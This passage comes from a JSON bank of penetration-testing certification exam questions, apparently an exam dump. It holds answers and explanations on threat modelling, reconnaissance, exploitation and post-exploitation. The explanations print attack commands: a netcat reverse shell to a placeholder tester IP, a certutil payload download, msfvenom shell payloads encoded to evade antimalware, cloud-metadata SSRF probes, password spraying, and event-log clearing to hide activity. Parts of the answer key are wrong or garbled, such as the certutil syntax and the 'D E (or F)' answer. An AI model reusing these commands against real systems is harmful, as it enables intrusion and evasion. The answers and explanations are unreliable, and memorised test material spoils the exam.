        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 81,
        "question_text": "A penetration tester needs to help create a threat model of a custom application. Which of the following is the most likely framework the tester will use?",
        "options": {
          "A": "MITRE ATT&CK",
          "B": "OSSTMM",
          "C": "CI/CD",
          "D": "DREAD"
        },
        "correct_answer": "D",
        "explanation": "The DREAD model is a risk assessment framework used to evaluate and prioritize the security risks of an \napplication. It stands for Damage potential, Reproducibility, Exploitability, Affected users, and \nDiscoverability.\n\nUnderstanding DREAD:\n\nPurpose: Provides a structured way to assess and prioritize risks based on their potential impact \nand likelihood.\n\nComponents:\n\nDamage Potential: The extent of harm that an exploit could cause.\n\nReproducibility: How easily the exploit can be reproduced.\n\nExploitability: The ease with which the vulnerability can be exploited.\n\nAffected Users: The number of users affected by the exploit.\n\nDiscoverability: The likelihood that the vulnerability will be discovered.\n\nUsage in Threat Modeling:\n\nEvaluation: Assign scores to each DREAD component to assess the overall risk.\n\nPrioritization: Higher scores indicate higher risks, helping prioritize remediation efforts.\n\nProcess:\n\nIdentify Threats: Enumerate potential threats to the application.\n\nAssess Risks: Use the DREAD model to evaluate each threat.\n\nPrioritize: Focus on addressing the highest-scoring threats first.\n\nReferences from Pentesting Literature:\n\nThe DREAD model is widely discussed in threat modeling and risk assessment sections of \npenetration testing guides.\n\nHTB write-ups often include references to DREAD when explaining how to assess and prioritize \nvulnerabilities in applications.\n\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups",
        "is_simulation": false,
        "domain": "1.0 Engagement Management",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 48,
        "question_text": "Which of the following will reduce the possibility of introducing errors or bias in a penetration test report?",
        "options": {
          "A": "Secure distribution",
          "B": "Peer review",
          "C": "Use AI",
          "D": "Goal reprioritization"
        },
        "correct_answer": "B",
        "explanation": "A peer review process ensures that a penetration test report is accurate, unbiased, and free from errors.\n\nPeer review (Option B):\n\nSenior security professionals verify findings, risk levels, and remediation recommendations.\n\nReduces the risk of misinterpretation or incorrect data in reports.",
        "is_simulation": false,
        "domain": "1.0 Engagement Management",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 59,
        "question_text": "Which of the following activities should be performed to prevent uploaded web shells from being exploited by others?",
        "options": {
          "A": "Remove the persistence mechanisms.",
          "B": "Spin down the infrastructure.",
          "C": "Preserve artifacts.",
          "D": "Perform secure data destruction."
        },
        "correct_answer": "A",
        "explanation": "Web shells provide remote access and persistence for attackers. The best mitigation is to remove persistence \nmechanisms.\n\nRemove the persistence mechanisms (Option A):\n\nAttackers often modify startup scripts, cron jobs, or registry keys to maintain access.\n\nIf persistence is not removed, even after the web shell is deleted, attackers can reinstall or \nreaccess it.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 98,
        "question_text": "A penetration tester presents the following findings to stakeholders:\nControl | Number of findings | Risk | Notes\nEncryption | 1 | Low | Weak algorithm noted\nPatching | 8 | Medium | Unsupported systems\nSystem hardening | 2 | Low | Baseline drift observed\nSecure SDLC | 10 | High | Libraries have vulnerabilities\nPassword policy | 0 | Low | No exceptions noted\nBased on the findings, which of the following recommendations should the tester make? (Select two).",
        "options": {
          "A": "Develop a secure encryption algorithm.",
          "B": "Deploy an asset management system.",
          "C": "Write an SDLC policy.",
          "D": "Implement an SCA tool.",
          "E": "Obtain the latest library version.",
          "F": "Patch the libraries."
        },
        "correct_answer": "D E",
        "explanation": "Based on the findings, the focus should be on addressing vulnerabilities in libraries and ensuring their \nsecurity. Here’s why options D and E are correct:\n\nImplement an SCA Tool:\n\nSCA (Software Composition Analysis) tools are designed to analyze and manage open-source \ncomponents in an application. Implementing an SCA tool would help in identifying and \nmanaging vulnerabilities in libraries, aligning with the finding of vulnerable libraries in the \nsecure SDLC process.\n\nThis recommendation addresses the high-risk finding related to the Secure SDLC by providing a \nsystematic approach to manage and mitigate vulnerabilities in software dependencies.\n\nObtain the Latest Library Version/Patch the Libraries (Options E & F - similar concept, typically obtaining latest IS patching):\n\nKeeping libraries up to date is a fundamental practice in maintaining the security of an \napplication. Ensuring that the latest, most secure versions of libraries are used directly addresses \nthe high-risk finding related to vulnerable libraries.\n\nThis recommendation is a direct and immediate action to mitigate the identified vulnerabilities.\n\nOther Options Analysis:\n\nDevelop a Secure Encryption Algorithm: This is not practical or necessary given that the issue is with \nthe use of a weak algorithm, not the need to develop a new one.\n\nDeploy an Asset Management System: While useful, this is not directly related to the identified high-\nrisk issue of vulnerable libraries.\n\nWrite an SDLC Policy: While helpful, the more immediate and effective actions involve implementing \ntools and processes to manage and update libraries.\n\nReferences from Pentest:\n\nHorizontall HTB: Demonstrates the importance of managing software dependencies and using tools to \nidentify and mitigate vulnerabilities in libraries.\n\nWriteup HTB: Highlights the need for keeping libraries updated to ensure application security and \nmitigate risks.\n\nConclusion:\nOptions D and E (or F, conceptually similar), implementing an SCA tool and obtaining the latest library version/patching, are the most appropriate \nrecommendations to address the high-risk finding related to vulnerable libraries in the Secure SDLC process.",
        "is_simulation": false,
        "domain": "3.0 Vulnerability Discovery and Analysis",
        "question_type": "multiple_choice_multiple_answer"
      },
      {
        "question_number": 79,
        "question_text": "A penetration tester gains initial access to an endpoint and needs to execute a payload to obtain additional access. Which of the following commands should the penetration tester use?",
        "options": {
          "A": "powershell.exe impo C:\\tools\\foo.ps1",
          "B": "certutil.exe -f https://192.168.0.1/foo.exe bad.exe",
          "C": "powershell.exe -noni -encode IEX.Downloadstring(\"http://172.16.0.1/\")",
          "D": "rundll32.exe c:\\path\\foo.dll,functName"
        },
        "correct_answer": "B",
        "explanation": "To execute a payload and gain additional access, the penetration tester should use certutil.exe. Here’s why:\n\nUsing certutil.exe:\n\nPurpose: certutil.exe is a built-in Windows utility that can be used to download files from a \nremote server, making it useful for fetching and executing payloads.\n\nCommand: certutil.exe -f https://192.168.0.1/foo.exe bad.exe downloads the file foo.exe from the \nspecified URL and saves it as bad.exe.\n\nComparison with Other Commands:\n\npowershell.exe impo C:\\tools\\foo.ps1 (A): Incorrect syntax and not as direct as using certutil for \ndownloading files.\n\npowershell.exe -noni -encode IEX.Downloadstring(\"http://172.16.0.1/\") (C): Incorrect syntax for \ndownloading and executing a script.\n\nrundll32.exe c:\\path\\foo.dll,functName (D): Used for executing DLLs, not suitable for \ndownloading a payload.\n\nUsing certutil.exe to download and execute a payload is a common and effective method.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 225,
        "question_text": "Which of the following is a term used to describe a situation in which a penetration tester bypasses physical access controls and gains access to a facility by entering at the same time as an employee?",
        "options": {
          "A": "Badge cloning",
          "B": "Shoulder surfing",
          "C": "Tailgating",
          "D": "Site survey"
        },
        "correct_answer": "C",
        "explanation": "Tailgating is the term used to describe a situation where a penetration tester bypasses physical access controls \nand gains access to a facility by entering at the same time as an employee.\n\nTailgating:\n\nDefinition: Tailgating occurs when an unauthorized person follows an authorized person into a \nrestricted area without the latter’s consent or knowledge. The authorized person typically opens a \ndoor or checkpoint, and the unauthorized person slips in behind them.\n\nExample: An attacker waits near the entrance of a building and enters right after an employee, \nbypassing security measures.\n\nPhysical Security:\n\nImportance: Physical security is a crucial aspect of overall security posture. Tailgating exploits \nhuman factors and weaknesses in physical security controls.\n\nPrevention: Security measures such as turnstiles, mantraps, and security personnel can help \nprevent tailgating.\n\nPentest References:\n\nPhysical Penetration Testing: Tailgating is a common technique used in physical penetration tests \nto assess the effectiveness of an organization’s physical security controls.\n\nSocial Engineering: Tailgating often involves social engineering, where the attacker relies on the \npoliteness or unawareness of the employee to gain unauthorized access.\n\nBy understanding and using tailgating, penetration testers can evaluate the effectiveness of an organization’s \nphysical security measures and identify potential vulnerabilities that could be exploited by malicious actors.",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 119,
        "question_text": "A penetration tester is ready to add shellcode for a specific remote executable exploit. The tester is trying to prevent the payload from being blocked by antimalware that is running on the target. Which of the following commands should the tester use to obtain shell access?",
        "options": {
          "A": "msfvenom --arch x86-64 --platform windows --encoder x86-64/shikata_ga_nai --payload windows/bind_tcp LPORT=443",
          "B": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=8000",
          "C": "msfvenom --arch x86-64 --platform windows --payload windows/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 EXITFUNC=none",
          "D": "net user add /administrator | hexdump > payload"
        },
        "correct_answer": "A",
        "explanation": "Using shikata_ga_nai:\n\nThis encoder obfuscates the payload, making it harder for antimalware to detect.\n\nThe command specifies a bind shell (windows/bind_tcp) payload, targeting Windows with \narchitecture x86-64.\n\nWhy Not Other Options?\n\nB, C: These commands generate payloads but do not use an encoder, increasing the likelihood of \ndetection by antimalware.\n\nD: This command is unrelated to generating shellcode; it appears to be an attempt to manipulate \naccounts.\n\nCompTIA Pentest+ References:\n\nDomain 3.0 (Attacks and Exploits)",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 63,
        "question_text": "A penetration tester finds an unauthenticated RCE vulnerability on a web server and wants to use it to enumerate other servers on the local network. The web server is behind a firewall that allows only an incoming connection to TCP ports 443 and 53 and unrestricted outbound TCP connections. The target web server is https://target.comptia.org. Which of the following should the tester use to perform the task with the fewest web requests?",
        "options": {
          "A": "nc -e /bin/sh -lp 53",
          "B": "/bin/sh -c 'nc -l -p 443'",
          "C": "nc -e /bin/sh <pentester_ip> 53",
          "D": "/bin/sh -c 'nc <pentester_ip> 443 -e /bin/sh'"
        },
        "correct_answer": "D",
        "explanation": "The tester needs to pivot from the compromised web server while bypassing firewall restrictions that allow:\n\nInbound traffic only on TCP 443 (HTTPS) and TCP 53 (DNS)\n\nUnrestricted outbound traffic\n\nReverse shell using TCP 443 (Option D):\n\nThis command initiates an outbound connection to the pentester's machine on port 443, which is \nallowed by the firewall.\n\nExample:\nbash\nCopyEdit\n/bin/sh -c 'nc <pentester_ip> 443 -e /bin/sh'\n\nThe pentester listens on TCP 443 and receives the shell from the target.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 25,
        "question_text": "While performing an internal assessment, a tester uses the following command:\ncrackmapexec smb 192.168.1.0/24 -u user.txt -p Summer123@\nWhich of the following is the main purpose of the command?",
        "options": {
          "A": "To perform a pass-the-hash attack over multiple endpoints within the internal network",
          "B": "To perform common protocol scanning within the internal network",
          "C": "To perform password spraying on internal systems",
          "D": "To execute a command in multiple endpoints at the same time"
        },
        "correct_answer": "C",
        "explanation": "The command crackmapexec smb 192.168.1.0/24 -u user.txt -p Summer123@ is used to perform password \nspraying on internal systems. CrackMapExec (CME) is a post-exploitation tool that helps automate the \nprocess of assessing large Active Directory networks. It supports multiple protocols, including SMB, and can \nperform various actions like password spraying, command execution, and more.\n\nCrackMapExec:\n\nCrackMapExec: A versatile tool designed for pentesters to facilitate the assessment of large \nActive Directory networks. It supports various protocols such as SMB, WinRM, and LDAP.\n\nPurpose: Commonly used for tasks like password spraying, credential validation, and command \nexecution.\n\nCommand Breakdown:\n\ncrackmapexec smb: Specifies the protocol to use, in this case, SMB (Server Message Block), \nwhich is commonly used for file sharing and communication between nodes in a network.\n\n192.168.1.0/24: The target IP range, indicating a subnet scan across all IP addresses in the range.\n\n-u user.txt: Specifies the file containing the list of usernames to be used for the attack.\n\n-p Summer123@: Specifies the password to be used for all usernames in the user.txt file.\n\nPassword Spraying:\n\nDefinition: A technique where a single password (or a small number of passwords) is tried \nagainst a large number of usernames to avoid account lockouts that occur when brute-forcing a \nsingle account.\n\nGoal: To find valid username-password combinations without triggering account lockout \nmechanisms.\n\nPentest References:\n\nPassword Spraying: An effective method for gaining initial access during penetration tests, particularly \nagainst organizations that have weak password policies or commonly used passwords.\n\nCrackMapExec: Widely used in penetration testing for its ability to automate and streamline the process \nof credential validation and exploitation across large networks.\n\nBy using the specified command, the tester performs a password spraying attack, attempting to log in with a \ncommon password across multiple usernames, identifying potential weak accounts.",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 168,
        "question_text": "During an assessment, a penetration tester runs the following command:\nsetspn.exe -Q /\nWhich of the following attacks is the penetration tester preparing for?",
        "options": {
          "A": "LDAP injection",
          "B": "Pass-the-hash",
          "C": "Kerberoasting",
          "D": "Dictionary"
        },
        "correct_answer": "C",
        "explanation": "Kerberoasting is an attack that involves requesting service tickets for service accounts from a Kerberos \nservice, extracting the service tickets, and attempting to crack them offline to retrieve the plaintext passwords.\n\nUnderstanding Kerberoasting:\n\nPurpose: To obtain service account passwords by cracking the encrypted service tickets (TGS \ntickets) offline.\n\nService Principal Names (SPNs): SPNs are used in Kerberos authentication to uniquely identify a \nservice instance.\n\nCommand Breakdown:\n\nsetspn.exe -Q /: This command queries all SPNs in the domain.\n\nUse Case: Identifying accounts with SPNs that can be targeted for Kerberoasting.\n\nKerberoasting Steps:\n\nIdentify SPNs: Use setspn.exe to list service accounts with SPNs.\n\nRequest TGS Tickets: Request TGS tickets for the identified SPNs.\n\nExtract Tickets: Use tools like Mimikatz to extract the service tickets.\n\nCrack Tickets: Use password cracking tools like Hashcat to crack the extracted tickets offline.\n\nReferences from Pentesting Literature:\n\nKerberoasting is a well-documented attack method in penetration testing guides, specifically \ntargeting service accounts in Active Directory environments.\n\nHTB write-ups often detail the use of Kerberoasting for gaining credentials from service accounts.\nStep-by-Step ExplanationReferences:\n\nPenetration Testing - A Hands-on Introduction to Hacking\n\nHTB Official Writeups\n=================",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 231,
        "question_text": "During an assessment, a penetration tester obtains access to an internal server and would like to perform further reconnaissance by capturing LLMNR traffic. Which of the following tools should the tester use?",
        "options": {
          "A": "Burp Suite",
          "B": "Netcat",
          "C": "Responder",
          "D": "Nmap"
        },
        "correct_answer": "C",
        "explanation": "Responder es una herramienta especializada para capturar tráfico LLMNR, NBNS y MDNS, y realizar \nataques de spoofing y captura de hashes. Es ampliamente utilizada en entornos Windows para capturar \ncredenciales cuando se resuelven nombres que no existen en el DNS.\nNetcat y Burp Suite no están diseñados para este propósito. Nmap sirve para escaneo de redes, pero no para \ncaptura ni explotación de LLMNR.\nReferencia: PT0-003 Objective 4.2 – Explain lateral movement techniques and privilege escalation tools \n(Responder is explicitly listed).",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 107,
        "question_text": "A tester gains initial access to a server and needs to enumerate all corporate domain DNS records. Which of the following commands should the tester use?",
        "options": {
          "A": "dig +short A AAAA local.domain",
          "B": "nslookup local.domain",
          "C": "dig axfr @local.dns.server",
          "D": "nslookup -server local.dns.server local.domain *"
        },
        "correct_answer": "C",
        "explanation": "La opción C, dig axfr @local.dns.server, realiza una transferencia de zona DNS (Zone Transfer). Si el \nservidor DNS está mal configurado y permite este tipo de solicitudes, el atacante puede obtener todos los \nregistros DNS del dominio interno.\nLa opción A muestra solo registros A/AAAA. La B no hace enumeración completa. La D no es válida como \nsintaxis.\nReferencia: PT0-003 Objective 3.3 – Perform domain enumeration using dig and DNS zone transfer \ntechniques.",
        "is_simulation": false,
        "domain": "2.0 Reconnaissance and Enumeration",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 35,
        "question_text": "Before starting an assessment, a penetration tester needs to scan a Class B IPv4 network for open ports in a short amount of time. Which of the following is the best tool for this task?",
        "options": {
          "A": "Burp Suite",
          "B": "masscan",
          "C": "Nmap",
          "D": "hping"
        },
        "correct_answer": "B",
        "explanation": "When needing to scan a large network for open ports quickly, the choice of tool is critical. Here’s why option \nB is correct:\n\nmasscan: This tool is designed for high-speed port scanning and can scan entire networks much faster \nthan traditional tools like Nmap. It can handle large ranges of IP addresses and ports with high \nefficiency.\n\nNmap: While powerful and versatile, Nmap is generally slower than masscan for scanning very large \nnetworks, especially when speed is crucial.\n\nBurp Suite: This tool is primarily for web application security testing and not optimized for network \nwide port scanning.\n\nhping: This is a network tool used for packet crafting and network testing, but it is not designed for \nhigh-speed network port scanning.\n\nReferences from Pentest:\n\nLuke HTB: Highlights the use of efficient tools for large-scale network scanning to identify open ports \nquickly.\n\nAnubis HTB: Demonstrates scenarios where high-speed scanning tools like masscan are essential for \nlarge network assessments.",
        "is_simulation": false,
        "domain": "2.0 Reconnaissance and Enumeration",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 115,
        "question_text": "A penetration tester discovers data to stage and exfiltrate. The client has authorized movement to the tester's attacking hosts only. Which of the following would be most appropriate to avoid alerting the SOC?",
        "options": {
          "A": "Apply UTF-8 to the data and send over a tunnel to TCP port 25.",
          "B": "Apply Base64 to the data and send over a tunnel to TCP port 80.",
          "C": "Apply 3DES to the data and send over a tunnel UDP port 53.",
          "D": "Apply AES-256 to the data and send over a tunnel to TCP port 443."
        },
        "correct_answer": "D",
        "explanation": "AES-256 (Advanced Encryption Standard with a 256-bit key) is a symmetric encryption algorithm widely \nused for securing data. Sending data over TCP port 443, which is typically used for HTTPS, helps to avoid \ndetection by network monitoring systems as it blends with regular secure web traffic.\n\nEncrypting Data with AES-256:\n\nUse a secure key and initialization vector (IV) to encrypt the data using the AES-256 algorithm.\n\nExample encryption command using OpenSSL:\nStep-by-Step Explanationopenssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k secretkey\n\nSetting Up a Secure Tunnel:\n\nUse a tool like OpenSSH to create a secure tunnel over TCP port 443.\n\nExample command to set up a tunnel:\nssh -L 443:targetserver:443 user@intermediatehost\n\nTransferring Data Over the Tunnel:\n\nUse a tool like Netcat or SCP to transfer the encrypted data through the tunnel.\n\nExample Netcat command to send data:\ncat encrypted.bin | nc targetserver 443\n\nBenefits of Using AES-256 and Port 443:\n\nSecurity: AES-256 provides strong encryption, making it difficult for attackers to decrypt the data \nwithout the key.\n\nStealth: Sending data over port 443 helps avoid detection by security monitoring systems, as it \nappears as regular HTTPS traffic.\n\nReal-World Example:\n\nDuring a penetration test, the tester needs to exfiltrate sensitive data without triggering alerts. By \nencrypting the data with AES-256 and sending it over a tunnel to TCP port 443, the data \nexfiltration blends in with normal secure web traffic.\n\nReferences from Pentesting Literature:\n\nVarious penetration testing guides and HTB write-ups emphasize the importance of using strong \nencryption like AES-256 for secure data transfer.\n\nTechniques for creating secure tunnels and exfiltrating data covertly are often discussed in \nadvanced pentesting resources.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 157,
        "question_text": "A penetration tester runs a vulnerability scan that identifies several issues across numerous customer hosts. The executive report outlines the following:\n[Table showing Server 1(Dev sandbox, 32 vulns), Server 2(Back office file transfer, 51 vulns), Server 3(Perimeter web, 14 vulns), Server 4(Dev QA, 92 vulns)]\nThe client is concerned about the availability of its consumer-facing production application. Which of the following hosts should the penetration tester select for additional manual testing?",
        "options": {
          "A": "Server 1",
          "B": "Server 2",
          "C": "Server 3",
          "D": "Server 4"
        },
        "correct_answer": "C",
        "explanation": "Since the client is worried about the availability of their consumer-facing application, the perimeter network \nweb server (Server 3) is the most critical because:\n\nIt is internet-facing, making it a prime target for attackers.\n\nA compromise could lead to data breaches, downtime, or service disruptions.\n\nEven though it has fewer vulnerabilities (14 vs. 92 on QA server), its exposure is higher.\n\nOption A (Development sandbox server) #: Internal and not publicly accessible.\n\nOption B (Back-office file transfer server) #: Important, but not consumer-facing.\n\nOption C (Perimeter web server) #: Correct. Publicly accessible and critical to operations.\n\nOption D (Developer QA server) #: May have more vulnerabilities, but it’s less critical.\n\n# Reference: CompTIA PenTest+ PT0-003 Official Guide – Prioritizing Vulnerability Testing",
        "is_simulation": false,
        "domain": "3.0 Vulnerability Discovery and Analysis",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 74,
        "question_text": "A penetration tester identifies an exposed corporate directory containing first and last names and phone numbers for employees. Which of the following attack techniques would be the most effective to pursue if the penetration tester wants to compromise user accounts?",
        "options": {
          "A": "Smishing",
          "B": "Impersonation",
          "C": "Tailgating",
          "D": "Whaling"
        },
        "correct_answer": "A",
        "explanation": "When a penetration tester identifies an exposed corporate directory containing first and last names and phone \nnumbers, the most effective attack technique to pursue would be smishing. Here's why:\n\nUnderstanding Smishing:\n\nSmishing (SMS phishing) involves sending fraudulent messages via SMS to trick individuals into \nrevealing personal information or performing actions that compromise security. Since the tester \nhas access to phone numbers, this method is directly applicable.\n\nWhy Smishing is Effective:\n\nPersonalization: Knowing the first and last names allows the attacker to personalize the messages, \nmaking them appear more legitimate and increasing the likelihood of the target responding.\n\nImmediate Access: People tend to trust and respond quickly to SMS messages compared to \nemails, especially if the messages appear urgent or important.\n\nAlternative Attack Techniques:\n\nImpersonation: While effective, it generally requires real-time interaction and may not scale well \nacross many targets.\n\nTailgating: This physical social engineering technique involves following someone into a \nrestricted area and is not feasible with just names and phone numbers.\n\nWhaling: This targets high-level executives with highly personalized phishing attacks. Although \neffective, it is more specific and may not be suitable for the broader set of employees in the \ndirectory.",
        "is_simulation": false,
        "domain": "4.0 Attacks and Exploits",
        "question_type": "multiple_choice_single_answer"
      },
      {
        "question_number": 23,
        "question_text": "During an engagement, a penetration tester found some weaknesses that were common across the customer’s entire environment. The weaknesses included the following:\nWeaker password settings than the company standard\nSystems without the company's endpoint security software installed\nOperating systems that were not updated by the patch management system\nWhich of the following recommendations should the penetration tester provide to address the root issue?",
        "options": {
          "A": "Add all systems to the vulnerability management system.",
          "B": "Implement a configuration management system.",
          "C": "Deploy an endpoint detection and response system.",
          "D": "Patch the out-of-date operating systems."
        },
        "correct_answer": "B",
        "explanation": "Identified Weaknesses:\n\nWeaker password settings than the company standard: Indicates inconsistency in password \npolicies across systems.\n\nSystems without the company's endpoint security software installed: Suggests lack of uniformity \nin security software deployment.\n\nOperating systems not updated by the patch management system: Points to gaps in patch \nmanagement processes.\n\nConfiguration Management System:\n\nDefinition: A configuration management system automates the deployment, maintenance, and \nenforcement of configurations across all systems in an organization.\n\nBenefits: Ensures consistency in security settings, software installations, and patch management \nacross the entire environment.\n\nExamples: Tools like Ansible, Puppet, and Chef can help automate and manage configurations, \nensuring compliance with organizational standards.\n\nOther Recommendations:\n\nVulnerability Management System: While adding systems to this system helps track \nvulnerabilities, it does not address the root cause of configuration inconsistencies.\n\nEndpoint Detection and Response (EDR): Useful for detecting and responding to threats, but not \nfor enforcing consistent configurations.\n\nPatch Management: Patching systems addresses specific vulnerabilities but does not solve \nbroader configuration management issues.\n\nPentest References:\n\nSystem Hardening: Ensuring all systems adhere to security baselines and configurations to reduce \nattack surfaces.\n\nAutomation in Security: Using configuration management tools to automate security practices, ensuring \ncompliance and reducing manual errors.\n\nImplementing a configuration management system addresses the root issue by ensuring consistent security \nconfigurations, software deployments, and patch management across the entire environment.",
        "is_simulation": false,
        "domain": "5.0 Post-exploitation and Lateral Movement",
        "question_type": "multiple_choice_single_answer"
      },
    {
      "question_number": 71,
      "question_text": "A penetration tester is conducting a wireless security assessment for a client with 2.4GHz and 5GHz access points. The tester places a wireless USB dongle in the laptop to start capturing WPA2 handshakes. Which of the following steps should the tester take next?",
      "options": {
        "A": "Enable monitoring mode using Aircrack-ng.",
        "B": "Use Kismet to automatically place the wireless dongle in monitor mode and collect handshakes.",
        "C": "Run KARMA to break the password.",
        "D": "Research WiGLE.net for potential nearby client access points."
      },
      "correct_answer": "A",
      "explanation": "Enabling monitoring mode on the wireless adapter is the essential step before capturing WPA2 handshakes. \nMonitoring mode allows the adapter to capture all wireless traffic in its vicinity, which is necessary for \ncapturing handshakes.\n\nPreparation:\n\nWireless USB Dongle: Ensure the wireless USB dongle is compatible with monitoring mode and \npacket injection.\n\nAircrack-ng Suite: Use the Aircrack-ng suite, a popular set of tools for wireless network auditing.\n\nEnable Monitoring Mode:\n\nCommand: Use the airmon-ng tool to enable monitoring mode on the wireless interface.\nStep-by-Step Explanationairmon-ng start wlan0\n\nVerify: Check if the interface is in monitoring mode.\niwconfig\n\nCapture WPA2 Handshakes:\n\nAirodump-ng: Use airodump-ng to start capturing traffic and handshakes.\nairodump-ng wlan0mon\n\nReferences from Pentesting Literature:\n\nEnabling monitoring mode is a fundamental step in wireless penetration testing, discussed in \nguides like \"Penetration Testing - A Hands-on Introduction to Hacking\".\n\nHTB write-ups often start with enabling monitoring mode before proceeding with capturing \nWPA2 handshakes.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 67,
      "question_text": "During a security assessment, a penetration tester gains access to an internal server and manipulates some data to hide its presence. Which of the following is the best way for the penetration tester to hide the activities performed?",
      "options": {
        "A": "Clear the Windows event logs.",
        "B": "Modify the system time.",
        "C": "Alter the log permissions.",
        "D": "Reduce the log retention settings."
      },
      "correct_answer": "A",
      "explanation": "During a penetration test, one of the critical steps for maintaining access and covering tracks is to clear \nevidence of the attack. Manipulating data to hide activities on an internal server involves ensuring that logs \nand traces of the attack are removed. Here's a detailed explanation of why clearing the Windows event logs is \nthe best method for this scenario:\n\nUnderstanding Windows Event Logs: Windows event logs are a key forensic artifact that records \nsystem, security, and application events. These logs can provide detailed information about user \nactivities, system changes, and potential security incidents.\n\nWhy Clear Windows Event Logs:\n\nComprehensive Coverage: Clearing the event logs removes all recorded events, including login \nattempts, application errors, and security alerts. This makes it difficult for an investigator to trace \nback the actions performed by the attacker.\n\nAvoiding Detection: Penetration testers clear event logs to ensure that their presence and \nactivities are not detected by system administrators or security monitoring tools.\n\nMethod to Clear Event Logs:\n\nUse the built-in Windows command line utility wevtutil to clear logs. For example:\nshell\nCopy code\nwevtutil cl System\nwevtutil cl Security\nwevtutil cl Application\n\nThese commands clear the System, Security, and Application logs, respectively.\n\nAlternative Options and Their Drawbacks:\n\nModify the System Time: Changing the system time can create confusion but is easily detectable \nand can be reverted. It does not erase existing log entries.\n\nAlter Log Permissions: Changing permissions might prevent new entries but does not remove \nexisting ones and can alert administrators to suspicious activity.\n\nReduce Log Retention Settings: This can limit future logs but does not affect already recorded \nlogs and can be easily noticed by administrators.\n\nCase References:\n\nHTB Writeups: Many Hack The Box (HTB) writeups demonstrate the importance of clearing \nlogs post-exploitation to maintain stealth. For example, in the \"Gobox\" and \"Writeup\" machines, \nmaintaining a low profile involved managing log data to avoid detection.\n\nReal-World Scenarios: In real-world penetration tests, attackers often clear logs to avoid \ndetection by forensic investigators and incident response teams. This step is crucial during red \nteam engagements and advanced persistent threat (APT) simulations.\n\nIn conclusion, clearing Windows event logs is a well-established practice for hiding activities during a \npenetration test. It is the most effective way to remove evidence of the attack from the system, thereby \nmaintaining stealth and ensuring that the tester's actions remain undetected.\n=================",
      "is_simulation": false,
      "domain": "5.0 Post-exploitation and Lateral Movement",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 209,
      "question_text": "A company hires a penetration tester to perform an external attack surface review as part of a security engagement. The company informs the tester that the main company domain to investigate is comptia.org. Which of the following should the tester do to accomplish the assessment objective?",
      "options": {
        "A": "Perform information-gathering techniques to review internet-facing assets for the company.",
        "B": "Perform a phishing assessment to try to gain access to more resources and users’ computers.",
        "C": "Perform a physical security review to identify vulnerabilities that could affect the company.",
        "D": "Perform a vulnerability assessment over the main domain address provided by the client."
      },
      "correct_answer": "A",
      "explanation": "Comprehensive and Detailed Explanation:\nAn external attack surface review focuses on identifying publicly accessible assets that an attacker could \nexploit. The first step in this process is information gathering, which involves enumerating domains, \nsubdomains, public IPs, DNS records, and other internet-facing resources. This is done using passive \nreconnaissance tools such as Whois, Shodan, Google Dorking, and OSINT techniques.\n\nOption A is correct because it aligns with the assessment goal—finding public-facing systems and their \nvulnerabilities before an attacker does.\n\nOption B (phishing assessment) is incorrect because it involves social engineering, which is not part of an \nexternal attack surface review.\n\nOption C (physical security review) is incorrect as it pertains to physical penetration testing, not an external \nattack analysis.\n\nOption D (vulnerability assessment) is incorrect because a vulnerability assessment is a later step after \nreconnaissance. The first step is identifying assets through information gathering.",
      "is_simulation": false,
      "domain": "2.0 Reconnaissance and Enumeration",
      "question_type": "multiple_choice_single_answer"
    },
    {
      "question_number": 186,
      "question_text": "A penetration tester has found a web application that is running on a cloud virtual machine instance. Vulnerability scans show a potential SSRF for the same application URL path with an injectable parameter. Which of the following commands should the tester run to successfully test for secrets exposure exploitability?",
      "options": {
        "A": "curl <url>?param=http://169.254.169.254/latest/meta-data/",
        "B": "curl '<url>?param=http://127.0.0.1/etc/passwd'",
        "C": "curl '<url>?param=<script>alert(1)</script>/'",
        "D": "curl <url>?param=http://127.0.0.1/"
      },
      "correct_answer": "A",
